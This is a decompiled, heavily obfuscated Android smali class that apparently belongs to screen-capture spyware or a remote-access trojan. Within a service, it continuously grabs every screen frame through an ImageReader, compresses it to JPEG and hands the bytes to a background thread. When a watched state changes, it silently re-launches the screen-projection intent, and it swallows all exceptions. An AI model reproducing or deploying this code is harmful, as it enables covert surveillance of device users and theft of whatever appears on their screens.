.class public Lfddo/catch;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Landroid/media/ImageReader$OnImageAvailableListener;


# static fields
.field private static goto:Z


# instance fields
.field final case:Landroid/content/Context;

.field private else:Lcom/beginhigh19/p067x;

.field private final fddo:Z

.field private for:Landroid/graphics/Bitmap;

.field private ifdf:Landroid/media/ImageReader;

.field private new:I

.field private try:I


# direct methods
.method public constructor <init>(Lcom/beginhigh19/p067x;)V
    .locals 3

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x1

    iput-boolean v0, p0, Lfddo/catch;->fddo:Z

    const/4 v1, 0x0

    iput-object v1, p0, Lfddo/catch;->ifdf:Landroid/media/ImageReader;

    iput-object v1, p0, Lfddo/catch;->for:Landroid/graphics/Bitmap;

    iput-object p1, p0, Lfddo/catch;->else:Lcom/beginhigh19/p067x;

    invoke-virtual {p1}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    iput-object p1, p0, Lfddo/catch;->case:Landroid/content/Context;

    :try_start_0
    invoke-virtual {p0}, Lfddo/catch;->new()V

    invoke-static {p1}, Lfddo/goto;->thgjpsmfghokamdgpjkmdghkmf(Landroid/content/Context;)Z

    move-result p1

    sput-boolean p1, Lfddo/catch;->goto:Z

    iget-object p1, p0, Lfddo/catch;->ifdf:Landroid/media/ImageReader;

    if-eqz p1, :cond_0

    invoke-virtual {p1}, Landroid/media/ImageReader;->close()V

    :cond_0
    iget p1, p0, Lfddo/catch;->new:I

    iget v1, p0, Lfddo/catch;->try:I

    const/4 v2, 0x2

    invoke-static {p1, v1, v0, v2}, Landroid/media/ImageReader;->newInstance(IIII)Landroid/media/ImageReader;

    move-result-object p1

    iput-object p1, p0, Lfddo/catch;->ifdf:Landroid/media/ImageReader;

    iget-object v0, p0, Lfddo/catch;->else:Lcom/beginhigh19/p067x;

    invoke-virtual {v0}, Lcom/beginhigh19/p067x;->for()Landroid/os/Handler;

    move-result-object v0

    invoke-virtual {p1, p0, v0}, Landroid/media/ImageReader;->setOnImageAvailableListener(Landroid/media/ImageReader$OnImageAvailableListener;Landroid/os/Handler;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method


# virtual methods
.method public fddo()I
    .locals 1

    iget v0, p0, Lfddo/catch;->try:I

    return v0
.end method

.method public for()I
    .locals 1

    iget v0, p0, Lfddo/catch;->new:I

    return v0
.end method

.method public ifdf()Landroid/view/Surface;
    .locals 1

    iget-object v0, p0, Lfddo/catch;->ifdf:Landroid/media/ImageReader;

    invoke-virtual {v0}, Landroid/media/ImageReader;->getSurface()Landroid/view/Surface;

    move-result-object v0

    return-object v0
.end method

.method public new()V
    .locals 4

    iget-object v0, p0, Lfddo/catch;->else:Lcom/beginhigh19/p067x;

    invoke-virtual {v0}, Lcom/beginhigh19/p067x;->new()Landroid/view/WindowManager;

    move-result-object v0

    invoke-interface {v0}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v0

    new-instance v1, Landroid/graphics/Point;

    invoke-direct {v1}, Landroid/graphics/Point;-><init>()V

    invoke-virtual {v0, v1}, Landroid/view/Display;->getSize(Landroid/graphics/Point;)V

    iget v0, v1, Landroid/graphics/Point;->x:I

    iput v0, p0, Lfddo/catch;->new:I

    iget v0, v1, Landroid/graphics/Point;->y:I

    :goto_0
    iput v0, p0, Lfddo/catch;->try:I

    iget v0, p0, Lfddo/catch;->new:I

    iget v1, p0, Lfddo/catch;->try:I

    mul-int v2, v0, v1

    const/high16 v3, 0x80000

    if-le v2, v3, :cond_0

    shr-int/lit8 v0, v0, 0x1

    iput v0, p0, Lfddo/catch;->new:I

    shr-int/lit8 v0, v1, 0x1

    goto :goto_0

    :cond_0
    return-void
.end method

.method public onImageAvailable(Landroid/media/ImageReader;)V
    .locals 0

    :try_start_0
    invoke-virtual {p0, p1}, Lfddo/catch;->try(Landroid/media/ImageReader;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public try(Landroid/media/ImageReader;)V
    .locals 5

    iget-object p1, p0, Lfddo/catch;->case:Landroid/content/Context;

    invoke-static {p1}, Lfddo/goto;->thgjpsmfghokamdgpjkmdghkmf(Landroid/content/Context;)Z

    move-result p1

    sget-boolean v0, Lfddo/catch;->goto:Z

    if-eq p1, v0, :cond_0

    iget-object p1, p0, Lfddo/catch;->case:Landroid/content/Context;

    invoke-static {p1}, Lfddo/goto;->thgjpsmfghokamdgpjkmdghkmf(Landroid/content/Context;)Z

    move-result p1

    sput-boolean p1, Lfddo/catch;->goto:Z

    new-instance p1, Landroid/content/Intent;

    iget-object v0, p0, Lfddo/catch;->case:Landroid/content/Context;

    const-class v1, Lcom/beginhigh19/p067x;

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget v0, Lcom/beginhigh19/p067x;->break:I

    const-string v1, "code"

    invoke-virtual {p1, v1, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object p1

    sget-object v0, Lcom/beginhigh19/p067x;->catch:Landroid/content/Intent;

    const-string v1, "intent"

    invoke-virtual {p1, v1, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    move-result-object p1

    iget-object v0, p0, Lfddo/catch;->case:Landroid/content/Context;

    invoke-static {v0, p1}, Lfddo/goto;->s(Landroid/content/Context;Landroid/content/Intent;)V

    return-void

    :cond_0
    iget-object p1, p0, Lfddo/catch;->ifdf:Landroid/media/ImageReader;

    invoke-virtual {p1}, Landroid/media/ImageReader;->acquireLatestImage()Landroid/media/Image;

    move-result-object p1

    if-nez p1, :cond_1

    return-void

    :cond_1
    invoke-virtual {p1}, Landroid/media/Image;->getPlanes()[Landroid/media/Image$Plane;

    move-result-object v0

    const/4 v1, 0x0

    aget-object v2, v0, v1

    invoke-virtual {v2}, Landroid/media/Image$Plane;->getBuffer()Ljava/nio/ByteBuffer;

    move-result-object v2

    aget-object v3, v0, v1

    invoke-virtual {v3}, Landroid/media/Image$Plane;->getPixelStride()I

    move-result v3

    aget-object v0, v0, v1

    invoke-virtual {v0}, Landroid/media/Image$Plane;->getRowStride()I

    move-result v0

    invoke-virtual {p1}, Landroid/media/Image;->close()V

    iget p1, p0, Lfddo/catch;->new:I

    mul-int v4, v3, p1

    sub-int/2addr v0, v4

    div-int/2addr v0, v3

    add-int/2addr p1, v0

    iget-object v0, p0, Lfddo/catch;->for:Landroid/graphics/Bitmap;

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->recycle()V

    :cond_2
    iget v0, p0, Lfddo/catch;->try:I

    sget-object v3, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static {p1, v0, v3}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object p1

    iput-object p1, p0, Lfddo/catch;->for:Landroid/graphics/Bitmap;

    invoke-virtual {p1, v2}, Landroid/graphics/Bitmap;->copyPixelsFromBuffer(Ljava/nio/Buffer;)V

    iget-object p1, p0, Lfddo/catch;->for:Landroid/graphics/Bitmap;

    iget v0, p0, Lfddo/catch;->new:I

    iget v2, p0, Lfddo/catch;->try:I

    invoke-static {p1, v1, v1, v0, v2}, Landroid/graphics/Bitmap;->createBitmap(Landroid/graphics/Bitmap;IIII)Landroid/graphics/Bitmap;

    move-result-object p1

    new-instance v0, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v1, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v2, 0x46

    invoke-virtual {p1, v1, v2, v0}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object p1

    new-instance v0, Lfddo/catch$fddo;

    invoke-direct {v0, p0, p1}, Lfddo/catch$fddo;-><init>(Lfddo/catch;[B)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method
